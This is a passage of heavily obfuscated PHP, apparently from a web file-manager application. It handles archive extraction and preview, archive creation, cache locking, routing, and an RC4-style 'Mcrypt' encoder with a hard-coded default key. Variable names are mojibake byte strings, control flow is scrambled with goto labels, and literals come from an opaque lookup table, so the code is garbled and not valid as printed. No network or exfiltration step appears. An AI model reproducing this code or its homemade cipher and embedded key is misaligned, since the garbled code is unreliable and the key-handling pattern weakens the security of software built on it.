$A‘Äƒ…Ÿ†¨ = PclTarExtractList($e¦Ïº¦äÀ¦, array($e†¤”ÚÃ‰÷), $Aé¨æ°áàÓ, $Bœ¢ºÇÔ—ˆ, $D‘É£’—Ä§); } else { $A‘Äƒ…Ÿ†¨ = PclTarExtract($e¦Ïº¦äÀ¦, $Aé¨æ°áàÓ, $dÊß ×àø[13], $D‘É£’—Ä§); } return array($dÊß ×àø[1029] => $A‘Äƒ…Ÿ†¨, $dÊß ×àø[1031] => PclErrorString(!0)); } else { if (self::checkIfType($D‘É£’—Ä§, $dÊß ×àø[1042])) { return kodRarArchive::extract($e¦Ïº¦äÀ¦, $Aé¨æ°áàÓ, $D‘É£’—Ä§, $aÃ‰‚Œù£‘); } else { if (kodZipArchive::support($dÊß ×àø[1920])) { return kodZipArchive::extract($e¦Ïº¦äÀ¦, $Aé¨æ°áàÓ, $aÃ‰‚Œù£‘); } else { $eŒ¥Ú¨®Œ = new PclZip($e¦Ïº¦äÀ¦); if ($A¯Ã´‘Õ != $dÊß ×àø[1028]) { $A‘Äƒ…Ÿ†¨ = $eŒ¥Ú¨®Œ->extract(PCLZIP_OPT_PATH, $Aé¨æ°áàÓ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $dÊß ×àø[1921], PCLZIP_OPT_BY_NAME, $c¦™ß‰ô†[$dÊß ×àø[1916]], PCLZIP_OPT_REMOVE_PATH, $Bœ¢ºÇÔ—ˆ, PCLZIP_OPT_REPLACE_NEWER); } else { $A‘Äƒ…Ÿ†¨ = $eŒ¥Ú¨®Œ->extract(PCLZIP_OPT_PATH, $Aé¨æ°áàÓ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $dÊß ×àø[1921], PCLZIP_OPT_REPLACE_NEWER); } return array($dÊß ×àø[1029] => $A‘Äƒ…Ÿ†¨, $dÊß ×àø[1031] => $eŒ¥Ú¨®Œ->errorName(!0)); } } } return array($dÊß ×àø[1029] => !1, $dÊß ×àø[1031] => $dÊß ×àø[1922]); goto fÎ“«—ÂÏ‡; eï­µœË©³: $dÊß ×àø =& $_SERVER[©]; self::init(); $D‘É£’—Ä§ = !empty($GLOBALS[$dÊß ×àø[1046]]) ? $GLOBALS[$dÊß ×àø[1046]] : get_path_ext($e¦Ïº¦äÀ¦); goto C•«Ã ‘é¹; C•«Ã ‘é¹: $a‹–íæ°š = self::listContent($e¦Ïº¦äÀ¦, !1); if (!$a‹–íæ°š[$dÊß ×àø[1029]]) { return $a‹–íæ°š; } if ($A¯Ã´‘Õ != $dÊß ×àø[1028]) { goto f¸Š¿®óê; f¸Š¿®óê: $c¦™ß‰ô† = self::fileIndex($a‹–íæ°š[$dÊß ×àø[1031]], $A¯Ã´‘Õ); $aÃ‰‚Œù£‘ = str_replace(array($dÊß ×àø[1069], $dÊß ×àø[1918]), $dÊß ×àø[80], $c¦™ß‰ô†[$dÊß ×àø[1916]]); $e†¤”ÚÃ‰÷ = $aÃ‰‚Œù£‘; goto cî¨ “º¢‡; cî¨ “º¢‡: if ($GLOBALS[$dÊß ×àø[16]][$dÊß ×àø[1150]] != $dÊß ×àø[335]) { $e†¤”ÚÃ‰÷ = unzip_pre_name($aÃ‰‚Œù£‘); } $Bœ¢ºÇÔ—ˆ = get_path_father($aÃ‰‚Œù£‘); if ($Bœ¢ºÇÔ—ˆ == $aÃ‰‚Œù£‘) { $Bœ¢ºÇÔ—ˆ = $dÊß ×àø[43]; } goto B°ˆö’é¦; B°ˆö’é¦: if ($c¦™ß‰ô†[$dÊß ×àø[86]]) { $e†¤”ÚÃ‰÷ = rtrim($e†¤”ÚÃ‰÷, $dÊß ×àø[18]) . $dÊß ×àø[18]; $aÃ‰‚Œù£‘ = array($aÃ‰‚Œù£‘); } $Eß°½Şùô = str_replace($dÊß ×àø[103], $dÊß ×àø[18], $e†¤”ÚÃ‰÷); if (substr($Eß°½Şùô, -1) == $dÊß ×àø[18]) { if (!strstr(trim($Eß°½Şùô, $dÊß ×àø[18]), $dÊß ×àø[18])) { $Aé¨æ°áàÓ = $Aé¨æ°áàÓ . get_path_this($Eß°½Şùô) . $dÊß ×àø[18]; } } else { if ($Bœ¢ºÇÔ—ˆ == $e†¤”ÚÃ‰÷) { $Bœ¢ºÇÔ—ˆ = $dÊß ×àø[43]; } } goto Fù…ºƒ‹ï»; Fù…ºƒ‹ï»: } goto AÚ†Ü£õ¾ô; fÎ“«—ÂÏ‡: } static function fileIndex($e¯ÄĞªŞì¯, $EŸÃçÆ ÷‰, $bÓœÒãÁ’ = false) { goto FÑ‘ä•ğ³; DÎ—Ôù‘¤«: $FÇˆÌÑöä = $DÆ¿òÉ•´Í; if ($bÓœÒãÁ’) { $FÇˆÌÑöä = $DÆ¿òÉ•´Í[$bÓœÒãÁ’]; if ($DÆ¿òÉ•´Í[$E“ˆ¹ËÚ¨[86]]) { $FÇˆÌÑöä = rtrim($FÇˆÌÑöä, $E“ˆ¹ËÚ¨[18]) . $E“ˆ¹ËÚ¨[18]; } } return $FÇˆÌÑöä; goto EÛôˆ½®Í™; BƒÂŒÕ Ÿì: $cÛ¼éµƒ´Æ = count($e¯ÄĞªŞì¯); for ($BºÍ¿ãÙë = 0; $BºÍ¿ãÙë < $cÛ¼éµƒ´Æ; $BºÍ¿ãÙë++) { if ($EŸÃçÆ ÷‰ == $e¯ÄĞªŞì¯[$BºÍ¿ãÙë][$E“ˆ¹ËÚ¨[1033]]) { $DÆ¿òÉ•´Í = $e¯ÄĞªŞì¯[$BºÍ¿ãÙë]; break; } } if (!$DÆ¿òÉ•´Í) { show_tips($E“ˆ¹ËÚ¨[1923]); } goto DÎ—Ôù‘¤«; FÑ‘ä•ğ³: $E“ˆ¹ËÚ¨ =& $_SERVER[©]; self::init(); if (!is_array($e¯ÄĞªŞì¯)) { return !1; } goto BƒÂŒÕ Ÿì; EÛôˆ½®Í™: } static function extractZipFile($eÒºŒéÖ›, $BÈˆ¹ÒŒµ, $aİİˆ„•ãÜ = false) { goto a÷¾Ú»ç²¢; a÷¾Ú»ç²¢: $CºÉ‘Ôšç =& $_SERVER[©]; self::init(); $eºšé¾ï¡´ = TEMP_FILES . hash_path($eÒºŒéÖ›) . $CºÉ‘Ôšç[18]; goto CŸ×™™ŞÑ¾; B…Ê‹óöÒ: if (!file_exists($eíŞ ÒóÅ)) { return !1; } @rename($eíŞ ÒóÅ, $B×±°›Šâ×); return $B×±°›Šâ×; goto eîˆï¹ÈÆ´; dÑŒÆÆç×õ: $C‰‰ˆâ¥¤’ = get_path_father($BÈˆ¹ÒŒµ); if ($C‰‰ˆâ¥¤’ == $BÈˆ¹ÒŒµ) { $C‰‰ˆâ¥¤’ = $CºÉ‘Ôšç[43]; } $CøÜé¶­”æ = $A°‚ôÔ›„²->extract(PCLZIP_OPT_PATH, $eºšé¾ï¡´, PCLZIP_CB_PRE_FILE_NAME, $CºÉ‘Ôšç[1921], PCLZIP_OPT_REMOVE_PATH, $C‰‰ˆâ¥¤’, PCLZIP_OPT_BY_NAME, $BÈˆ¹ÒŒµ); goto B…Ê‹óöÒ; d«·ŠÖ¹¢‚: if (file_exists($B×±°›Šâ×)) { return $B×±°›Šâ×; } $A°‚ôÔ›„² = new PclZip($eÒºŒéÖ›); $eíŞ ÒóÅ = unzip_filter_ext($eºšé¾ï¡´ . get_path_this($BÈˆ¹ÒŒµ)); goto dÑŒÆÆç×õ; CŸ×™™ŞÑ¾: mk_dir($eºšé¾ï¡´); $B×±°›Šâ× = $eºšé¾ï¡´ . md5($eÒºŒéÖ› . $BÈˆ¹ÒŒµ); if ($aİİˆ„•ãÜ) { $B×±°›Šâ× = $eºšé¾ï¡´ . $aİİˆ„•ãÜ; } goto d«·ŠÖ¹¢‚; eîˆï¹ÈÆ´: } static function filePreview($BŠÛ“ÊˆÓ, $f®İáãÓÑ¦, $fõË¥Ï´¯Ô = false, $dö‘ùáèÄ» = false) { goto F‹Òóø“ÈŒ; bÏ¨¤³äß: if (!file_exists($e–éğì×ôÏ)) { del_dir($dÄ‰¾ÆÑ’); show_json($cĞÄÄ­Œì¼[1926]); } IO::fileOut($e–éğì×ôÏ, $fõË¥Ï´¯Ô, $d´æØ•Î¹¢); goto f¡îíÒ¡; bŒÖÙÌËÙµ: $Cèë–›®Ä° = self::extract($BŠÛ“ÊˆÓ, $dÄ‰¾ÆÑ’, $f®İáãÓÑ¦, $bÄ°ğä¦¦ø); if (is_array($bÄ°ğä¦¦ø)) { show_json($cĞÄÄ­Œì¼[1924], !1); } if (file_exists($e–éğì×ôÏ)) { IO::fileOut($e–éğì×ôÏ, $fõË¥Ï´¯Ô, get_path_this($bÄ°ğä¦¦ø)); return; } goto E™ÁáñõÉ; F‹Òóø“ÈŒ: $cĞÄÄ­Œì¼ =& $_SERVER[©]; self::init(); $dÄ‰¾ÆÑ’ = TEMP_FILES . hash_path($BŠÛ“ÊˆÓ) . $cĞÄÄ­Œì¼[18]; goto BÀ’¥§»ã; BÀ’¥§»ã: mk_dir($dÄ‰¾ÆÑ’); $e–éğì×ôÏ = $dÄ‰¾ÆÑ’ . md5($BŠÛ“ÊˆÓ . $f®İáãÓÑ¦ . $dö‘ùáèÄ»); $bÄ°ğä¦¦ø = $cĞÄÄ­Œì¼[43]; goto bŒÖÙÌËÙµ; E™ÁáñõÉ: $bÄ°ğä¦¦ø = unzip_pre_name($bÄ°ğä¦¦ø); $d´æØ•Î¹¢ = get_path_this($bÄ°ğä¦¦ø); $dÍ˜‹ˆ¢­¿ = unzip_filter_ext($dÄ‰¾ÆÑ’ . $d´æØ•Î¹¢); goto cÍ³‹ç±×‡; cÍ³‹ç±×‡: if (!$Cèë–›®Ä°[$cĞÄÄ­Œì¼[1029]]) { show_json($Cèë–›®Ä°[$cĞÄÄ­Œì¼[1031]], !1); } if (!file_exists($dÍ˜‹ˆ¢­¿)) { show_json($cĞÄÄ­Œì¼[1925], !1); } @rename($dÍ˜‹ˆ¢­¿, $e–éğì×ôÏ); goto bÏ¨¤³äß; f¡îíÒ¡: } static function create($eë‡è‚øÂ, $fÚâ©®Âª÷) { $Dë¦™¾ÈÏ =& $_SERVER[©]; self::init(); $AÖŸÇùà = get_path_ext($eë‡è‚øÂ); $aĞ¾£ÔÅº‰ = !1; if (self::checkIfType($AÖŸÇùà, $Dë¦™¾ÈÏ[310])) { if (kodZipArchive::support($Dë¦™¾ÈÏ[1008])) { return kodZipArchive::create($eë‡è‚øÂ, $fÚâ©®Âª÷); } $cÒ±ªÕ¾Åª = new PclZip($eë‡è‚øÂ); foreach ($fÚâ©®Âª÷ as $EŒßŠ°¿ƒñ => $EŞÕ»ˆ®µŸ) { $EŞÕ»ˆ®µŸ = str_replace($Dë¦™¾ÈÏ[475], $Dë¦™¾ÈÏ[18], $EŞÕ»ˆ®µŸ); $bƒö›˜­Ëƒ = Kodio::clear(get_path_father($EŞÕ»ˆ®µŸ)); if ($EŒßŠ°¿ƒñ == 0) { $aĞ¾£ÔÅº‰ = $cÒ±ªÕ¾Åª->create($EŞÕ»ˆ®µŸ, PCLZIP_OPT_REMOVE_PATH, $bƒö›˜­Ëƒ, PCLZIP_CB_PRE_FILE_NAME, $Dë¦™¾ÈÏ[1927]); continue; } $aĞ¾£ÔÅº‰ = $cÒ±ªÕ¾Åª->add($EŞÕ»ˆ®µŸ, PCLZIP_OPT_REMOVE_PATH, $bƒö›˜­Ëƒ, PCLZIP_CB_PRE_FILE_NAME, $Dë¦™¾ÈÏ[1927]); } } else { if (self::checkIfType($AÖŸÇùà, $Dë¦™¾ÈÏ[1898])) { foreach ($fÚâ©®Âª÷ as $EŒßŠ°¿ƒñ => $EŞÕ»ˆ®µŸ) { $EŞÕ»ˆ®µŸ = str_replace($Dë¦™¾ÈÏ[475], $Dë¦™¾ÈÏ[18], $EŞÕ»ˆ®µŸ); $bƒö›˜­Ëƒ = Kodio::clear(get_path_father($EŞÕ»ˆ®µŸ)); if ($EŒßŠ°¿ƒñ == 0) { $aĞ¾£ÔÅº‰ = PclTarCreate($eë‡è‚øÂ, array($EŞÕ»ˆ®µŸ), $AÖŸÇùà, null, $bƒö›˜­Ëƒ); continue; } $aĞ¾£ÔÅº‰ = PclTarAddList($eë‡è‚øÂ, array($EŞÕ»ˆ®µŸ), $Dë¦™¾ÈÏ[43], $bƒö›˜­Ëƒ, $AÖŸÇùà); } } } return $aĞ¾£ÔÅº‰; } } class Mcrypt { public static $defaultKey = "\x61\41\x74\x61\153\x41\72\144\154\155\143\x6c\x64\x45\x76\x2c\x65"; public static function encode($CÍÌ¥ññˆ, $D»ÄÚĞ‰µ¤ = '', $eÑ¹¡”Ñé = 0, $EÏäµ¾ŠíÔ = '') { goto FšêØÚÊÅ–; Fã¥ñìã¯: $CÍÌ¥ññˆ = sprintf($C¶¾åçõœÂ[1928], $eÑ¹¡”Ñé ? $eÑ¹¡”Ñé + time() : 0) . substr(md5($CÍÌ¥ññˆ . $b®ìƒ¦ƒ„¶), 0, 16) . $CÍÌ¥ññˆ; $E¬—Òæî‡‹ = strlen($CÍÌ¥ññˆ); $aõÑÁ¶èÛ˜ = array(); goto bµó­’÷Úƒ; cìÙ…­†ŞÒ: $cƒ‹î‚Ğ¶¡ = md5(substr($D»ÄÚĞ‰µ¤, 0, 16)); $b®ìƒ¦ƒ„¶ = md5(substr($D»ÄÚĞ‰µ¤, 16, 16)); $EÏäµ¾ŠíÔ = $EÏäµ¾ŠíÔ ? $EÏäµ¾ŠíÔ : md5(microtime()); goto B×«Å‚ÖÕ; bµó­’÷Úƒ: for ($dïÓğâ£ğ = 0; $dïÓğâ£ğ <= 255; $dïÓğâ£ğ++) { $aõÑÁ¶èÛ˜[$dïÓğâ£ğ] = ord($B‰Áäò¥«ñ[$dïÓğâ£ğ % $BãÄ‹öˆ·‘]); } $eñ·Ú‰âÈè = range(0, 255); for ($fæ»ŠŞñ³ç = $dïÓğâ£ğ = 0; $dïÓğâ£ğ < 256; $dïÓğâ£ğ++) { $fæ»ŠŞñ³ç = ($fæ»ŠŞñ³ç + $eñ·Ú‰âÈè[$dïÓğâ£ğ] + $aõÑÁ¶èÛ˜[$dïÓğâ£ğ]) % 256; $CĞó—ßƒœî = $eñ·Ú‰âÈè[$dïÓğâ£ğ]; $eñ·Ú‰âÈè[$dïÓğâ£ğ] = $eñ·Ú‰âÈè[$fæ»ŠŞñ³ç]; $eñ·Ú‰âÈè[$fæ»ŠŞñ³ç] = $CĞó—ßƒœî; } goto e³¿Å¼Úà; aÌÎÇÛí¥: $EªÅ­¨Ñ = str_replace(array($C¶¾åçõœÂ[293], $C¶¾åçõœÂ[18], $C¶¾åçõœÂ[904]), array($C¶¾åçõœÂ[420], $C¶¾åçõœÂ[80], $C¶¾åçõœÂ[101]), $EªÅ­¨Ñ); return $EªÅ­¨Ñ; goto DæÅÉ¯ÔŒ; B×«Å‚ÖÕ: $dÍ‚ÂÑÍõš = substr($EÏäµ¾ŠíÔ, -$F»Ê‹Ä‹ñŠ); $B‰Áäò¥«ñ = $cƒ‹î‚Ğ¶¡ . md5($cƒ‹î‚Ğ¶¡ . $dÍ‚ÂÑÍõš); $BãÄ‹öˆ·‘ = strlen($B‰Áäò¥«ñ); goto Fã¥ñìã¯; e³¿Å¼Úà: $EªÅ­¨Ñ = $C¶¾åçõœÂ[43]; for ($DÙ•áÈÉÈ = $fæ»ŠŞñ³ç = $dïÓğâ£ğ = 0; $dïÓğâ£ğ < $E¬—Òæî‡‹; $dïÓğâ£ğ++) { $DÙ•áÈÉÈ = ($DÙ•áÈÉÈ + 1) % 256; $fæ»ŠŞñ³ç = ($fæ»ŠŞñ³ç + $eñ·Ú‰âÈè[$DÙ•áÈÉÈ]) % 256; $CĞó—ßƒœî = $eñ·Ú‰âÈè[$DÙ•áÈÉÈ]; $eñ·Ú‰âÈè[$DÙ•áÈÉÈ] = $eñ·Ú‰âÈè[$fæ»ŠŞñ³ç]; $eñ·Ú‰âÈè[$fæ»ŠŞñ³ç] = $CĞó—ßƒœî; $EªÅ­¨Ñ .= chr(ord($CÍÌ¥ññˆ[$dïÓğâ£ğ]) ^ $eñ·Ú‰âÈè[($eñ·Ú‰âÈè[$DÙ•áÈÉÈ] + $eñ·Ú‰âÈè[$fæ»ŠŞñ³ç]) % 256]); } $EªÅ­¨Ñ = $dÍ‚ÂÑÍõš . str_replace($C¶¾åçõœÂ[904], $C¶¾åçõœÂ[43], base64_encode($EªÅ­¨Ñ)); goto aÌÎÇÛí¥; FšêØÚÊÅ–: $C¶¾åçõœÂ =& $_SERVER[©]; $F»Ê‹Ä‹ñŠ = 4; $D»ÄÚĞ‰µ¤ = md5($D»ÄÚĞ‰µ¤ ? $D»ÄÚĞ‰µ¤ : self::$defaultKey); goto cìÙ…­†ŞÒ; DæÅÉ¯ÔŒ: } public static function decode($Aô¢å÷‹ â, $dâÕ›×²‘ù = '') { goto Aã«ï†Å¯; f×­ÖÓ…‡ó: $dâÕ›×²‘ù = md5($dâÕ›×²‘ù ? $dâÕ›×²‘ù : self::$defaultKey); $a…÷œÎĞ«È = md5(substr($dâÕ›×²‘ù, 0, 16)); $f­£º¹¼Œµ = md5(substr($dâÕ›×²‘ù, 16, 16)); goto cò›¹”è; AÀÕÄÉÆÅŒ: if (($fõÎ¢Ş—ö == 0 || $fõÎ¢Ş—ö - time() > 0) && substr($Cã§‹à“ËØ, 10, 16) == substr(md5(substr($Cã§‹à“ËØ, 26) . $f­£º¹¼Œµ), 0, 16)) { return substr($Cã§‹à“ËØ, 26); } else { return $d¦âË‰Ğ¤[43]; } goto FšôÉ×‚¡…; bØŞ½ä°Êó: $Aô¢å÷‹ â = base64_decode(substr($Aô¢å÷‹ â, $Aœ½ë™ºÆâ)); $féß™ªê±„ = strlen($Aô¢å÷‹ â); $A½¿óïÇ„« = array(); goto EğÛŒ…ïÔ‡; cò›¹”è: $e·î¶¾äŒ = substr($Aô¢å÷‹ â, 0, $Aœ½ë™ºÆâ); $b•Îº—ˆ›‡ = $a…÷œÎĞ«È . md5($a…÷œÎĞ«È . $e·î¶¾äŒ); $fÏ„âŒ¨ = strlen($b•Îº—ˆ›‡); goto bØŞ½ä°Êó; EğÛŒ…ïÔ‡: for ($aáÜÄŒÊ“ß = 0; $aáÜÄŒÊ“ß <= 255; $aáÜÄŒÊ“ß++) { $A½¿óïÇ„«[$aáÜÄŒÊ“ß] = ord($b•Îº—ˆ›‡[$aáÜÄŒÊ“ß % $fÏ„âŒ¨]); } $a‘êùãÊ = range(0, 255); for ($AÓÚ‰íí”ğ = $aáÜÄŒÊ“ß = 0; $aáÜÄŒÊ“ß < 256; $aáÜÄŒÊ“ß++) { $AÓÚ‰íí”ğ = ($AÓÚ‰íí”ğ + $a‘êùãÊ[$aáÜÄŒÊ“ß] + $A½¿óïÇ„«[$aáÜÄŒÊ“ß]) % 256; $AÎ˜±À’îË = $a‘êùãÊ[$aáÜÄŒÊ“ß]; $a‘êùãÊ[$aáÜÄŒÊ“ß] = $a‘êùãÊ[$AÓÚ‰íí”ğ]; $a‘êùãÊ[$AÓÚ‰íí”ğ] = $AÎ˜±À’îË; } goto BŞ ™¬ŠÍ§; Aã«ï†Å¯: $d¦âË‰Ğ¤ =& $_SERVER[©]; $Aô¢å÷‹ â = str_replace(array($d¦âË‰Ğ¤[420], $d¦âË‰Ğ¤[80], $d¦âË‰Ğ¤[101]), array($d¦âË‰Ğ¤[293], $d¦âË‰Ğ¤[18], $d¦âË‰Ğ¤[904]), $Aô¢å÷‹ â); $Aœ½ë™ºÆâ = 4; goto f×­ÖÓ…‡ó; BŞ ™¬ŠÍ§: $Cã§‹à“ËØ = $d¦âË‰Ğ¤[43]; for ($a¬ïÔ‚ĞÅ = $AÓÚ‰íí”ğ = $aáÜÄŒÊ“ß = 0; $aáÜÄŒÊ“ß < $féß™ªê±„; $aáÜÄŒÊ“ß++) { $a¬ïÔ‚ĞÅ = ($a¬ïÔ‚ĞÅ + 1) % 256; $AÓÚ‰íí”ğ = ($AÓÚ‰íí”ğ + $a‘êùãÊ[$a¬ïÔ‚ĞÅ]) % 256; $AÎ˜±À’îË = $a‘êùãÊ[$a¬ïÔ‚ĞÅ]; $a‘êùãÊ[$a¬ïÔ‚ĞÅ] = $a‘êùãÊ[$AÓÚ‰íí”ğ]; $a‘êùãÊ[$AÓÚ‰íí”ğ] = $AÎ˜±À’îË; $Cã§‹à“ËØ .= chr(ord($Aô¢å÷‹ â[$aáÜÄŒÊ“ß]) ^ $a‘êùãÊ[($a‘êùãÊ[$a¬ïÔ‚ĞÅ] + $a‘êùãÊ[$AÓÚ‰íí”ğ]) % 256]); } $fõÎ¢Ş—ö = intval(substr($Cã§‹à“ËØ, 0, 10)); goto AÀÕÄÉÆÅŒ; FšôÉ×‚¡…: } } define($_SERVER[©][1929], 1); goto d ï‹³±Ç…; f²¥¶Ô‡£Â: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto BÁ•äŠÌ‘; BÁ•äŠÌ‘: $eÅâ½ÈØÌ =& $_SERVER[©]; if (self::$handle) { return self::$handle; } $d•®™öÜ—° = $GLOBALS[$eÅâ½ÈØÌ[16]][$eÅâ½ÈØÌ[346]]; goto f‘²Ûğ›; FÁÄâ¬‡Î¡: if ($F­¤Òë¬ƒ == $eÅâ½ÈØÌ[27] && $Ağæå¤—— == $eÅâ½ÈØÌ[19]) { $F­¤Òë¬ƒ = $eÅâ½ÈØÌ[177]; } switch ($F­¤Òë¬ƒ) { case $eÅâ½ÈØÌ[757]: self::$handle = new CacheLockRedis(); break; case $eÅâ½ÈØÌ[758]: self::$handle = new CacheLockMemcached(); break; case $eÅâ½ÈØÌ[27]: self::$handle = new CacheLockDatabase(); break; case $eÅâ½ÈØÌ[177]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto FŸÀŞå¹ÀÙ; f‘²Ûğ›: self::$timeout = $d•®™öÜ—°[$eÅâ½ÈØÌ[767]] ? $d•®™öÜ—°[$eÅâ½ÈØÌ[767]] : 10; $Ağæå¤—— = _get($GLOBALS[$eÅâ½ÈØÌ[16]], $eÅâ½ÈØÌ[768]); $F­¤Òë¬ƒ = $d•®™öÜ—°[$eÅâ½ÈØÌ[754]] ? $d•®™öÜ—°[$eÅâ½ÈØÌ[754]] : $eÅâ½ÈØÌ[177]; goto FÁÄâ¬‡Î¡; FŸÀŞå¹ÀÙ: } private static function key($B×Éâ‹™·) { return $_SERVER[©][769] . Cache::key($B×Éâ‹™·); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($f¡Ö­µ¦ï = '') { self::$errorMsg = $f¡Ö­µ¦ï; } public static function lockGlobal($e›á½ŸÍÄà, $fÏÕÒêÚô) { return self::lock($e›á½ŸÍÄà, $fÏÕÒêÚô, !0); } public static function lock($dØ¥‚±É–§, $cŸ·ôåÈÂñ = false, $e Òã‘Ëˆ = false) { goto F„Åò™—ğ; F‰ÇÄçåí÷: $cŸ·ôåÈÂñ = $cŸ·ôåÈÂñ ? $cŸ·ôåÈÂñ : self::$timeout; $bµ‹”ºóâæ = $föªĞÄİÄ‚->lock($aãµ „Úö×, $cŸ·ôåÈÂñ); if (!$bµ‹”ºóâæ) { $eì¿•øÃ = $Dã³¿Ôà‹·[770] . $cŸ·ôåÈÂñ . $Dã³¿Ôà‹·[77] . self::$errorMsg . $Dã³¿Ôà‹·[77] . get_caller_msg(); $D‹¸ƒ“°‹ = "\x4c\x6f\143\153\x20\x61\x63\164\x69\157\x6e\72\40{$aãµ „Úö×}\40\164\151\x6d\x65\157\165\x74\54\x6f\166\145\x72\40{$cŸ·ôåÈÂñ}\x20\x73"; $D‹¸ƒ“°‹ = self::$errorMsg ? self::$errorMsg : $cç§Ô´£°Â; write_log($eì¿•øÃ, $Dã³¿Ôà‹·[771]); show_json($D‹¸ƒ“°‹, !1); } goto Eµ·‘´ê†¢; F„Åò™—ğ: $Dã³¿Ôà‹· =& $_SERVER[©]; $föªĞÄİÄ‚ = self::init(); $aãµ „Úö× = self::key($dØ¥‚±É–§); goto F‰ÇÄçåí÷; Eµ·‘´ê†¢: if (!$e Òã‘Ëˆ) { self::$lockItem[$aãµ „Úö×] = !0; } return $bµ‹”ºóâæ; goto aÃî´¾†’; aÃî´¾†’: } public static function lockGet($AÎÂ¦Üù™Ÿ) { $DÑóáÎ„‰ = self::key($AÎÂ¦Üù™Ÿ); if (self::$lockItem[$DÑóáÎ„‰]) { return self::$lockItem[$DÑóáÎ„‰]; } return self::init()->lockGet($DÑóáÎ„‰); } public static function unlock($BÂ†ä±Í¸–) { $aŒ¢ †¹¨Ë = self::key($BÂ†ä±Í¸–); self::$lockItem[$aŒ¢ †¹¨Ë] = null; return self::init()->unlock($aŒ¢ †¹¨Ë); } public static function unlockRuntime() { $cùºäÏö§Õ =& $_SERVER[©]; $f‹İ››å’´ = self::init(); $AĞå¿Ë¾·ó = !1; foreach (self::$lockItem as $f×¿ÚØ­§ => $d®òÑ÷ªØ„) { if (!$d®òÑ÷ªØ„) { continue; } $f‹İ››å’´->unlock($f×¿ÚØ­§); if (!$AĞå¿Ë¾·ó) { $AĞå¿Ë¾·ó = !0; write_log($cùºäÏö§Õ[772] . $f×¿ÚØ­§ . $cùºäÏö§Õ[77] . get_caller_msg(), $cùºäÏö§Õ[771]); continue; } write_log($cùºäÏö§Õ[772] . $f×¿ÚØ­§, $cùºäÏö§Õ[771]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $fºŠÄÃÇ‘Ò =& $_SERVER[©]; $a•±Û‚·áÍ = $GLOBALS[$fºŠÄÃÇ‘Ò[16]][$fºŠÄÃÇ‘Ò[346]]; self::$cachePath = $a•±Û‚·áÍ[$fºŠÄÃÇ‘Ò[177]][$fºŠÄÃÇ‘Ò[85]]; @mkdir(self::$cachePath, 511, !0); } public function lock($bîß‰·ªôÑ, $B”Œ†¾‚ù = 0) { goto B’¹‚É­Ï´; b¹Â²ÉŒ ‹: $this->unlock($bîß‰·ªôÑ); return !1; goto aÓÄ¸¿š; D‰ÄÜ‰˜Åé: $Cğï…”¼ŒŸ = rtrim(self::$cachePath, $aÁóï±ÙˆŒ[18]) . $aÁóï±ÙˆŒ[773] . md5($bîß‰·ªôÑ) . $aÁóï±ÙˆŒ[774]; if (file_exists($Cğï…”¼ŒŸ) && filemtime($Cğï…”¼ŒŸ) && filemtime($Cğï…”¼ŒŸ) < time() - 10) { @unlink($Cğï…”¼ŒŸ); } do { if (file_exists($Cğï…”¼ŒŸ)) { cacheLockWait(); continue; } $eÔ¿ĞÍ§„ = fopen($Cğï…”¼ŒŸ, $aÁóï±ÙˆŒ[775]); if (!$eÔ¿ĞÍ§„) { return !1; } $CÏ×¹§‹»› = flock($eÔ¿ĞÍ§„, LOCK_EX | LOCK_NB); self::$caches[$bîß‰·ªôÑ] = array($aÁóï±ÙˆŒ[776] => $eÔ¿ĞÍ§„, $aÁóï±ÙˆŒ[177] => $Cğï…”¼ŒŸ); fwrite($eÔ¿ĞÍ§„, $Eµ° ²Œğ); clearstatcache(); if ($eÔ¿ĞÍ§„ && $CÏ×¹§‹»›) { return !0; } cacheLockWait(); } while (microtime(!0) < $Eµ° ²Œğ); goto b¹Â²ÉŒ ‹; B’¹‚É­Ï´: $aÁóï±ÙˆŒ =& $_SERVER[©]; $fµàñô½ù… = microtime(!0); $Eµ° ²Œğ = $fµàñô½ù… + $B”Œ†¾‚ù + 0.0001; goto D‰ÄÜ‰˜Åé; aÓÄ¸¿š: } public function lockGet($D§¥ãßêŒï) { $EÁˆÅšÄ›³ =& $_SERVER[©]; $E¯ÉØ‘‚Ê‚ = rtrim(self::$cachePath, $EÁˆÅšÄ›³[18]) . $EÁˆÅšÄ›³[773] . md5($D§¥ãßêŒï) . $EÁˆÅšÄ›³[774]; return file_exists($E¯ÉØ‘‚Ê‚); } public function unlock($Aß¸Áøä¿) { goto aŠèè²‘Ô; aŠèè²‘Ô: $Bì£ÆŞìà =& $_SERVER[©]; $FŞ©ŒĞ¬¨ = self::$caches[$Aß¸Áøä¿]; if (!$FŞ©ŒĞ¬¨) { return; } goto A«´ÊƒĞœ; A«´ÊƒĞœ: @flock($FŞ©ŒĞ¬¨[$Bì£ÆŞìà[776]], LOCK_UN); @fclose($FŞ©ŒĞ¬¨[$Bì£ÆŞìà[776]]); @unlink($FŞ©ŒĞ¬¨[$Bì£ÆŞìà[177]]); goto e‘³Š±¤†ã; e‘³Š±¤†ã: unset(self::$caches[$Aß¸Áøä¿]); goto Aß¶Ã±‡Ï¯; Aß¶Ã±‡Ï¯: } } goto c½¸ÒµÎà; eìÊÅĞ¸ö: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\133\136\57\x5d\x2b", "\72\156\x75\x6d" => "\x5b\x30\55\x39\135\53", "\72\x61\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($Cù¼™ãÔƒº, $E”È¡·¯ÂÔ) { $cš„ù”ÔÛÌ =& $_SERVER[©]; if ($Cù¼™ãÔƒº == $cš„ù”ÔÛÌ[1383]) { $b‚ç—ÛË÷Ò = array_map($cš„ù”ÔÛÌ[1384], $E”È¡·¯ÂÔ[0]); $aÒÅ×µ³Àö = strpos($E”È¡·¯ÂÔ[1], $cš„ù”ÔÛÌ[18]) === 0 ? $E”È¡·¯ÂÔ[1] : $cš„ù”ÔÛÌ[18] . $E”È¡·¯ÂÔ[1]; $eÄğ°Ä¬† = 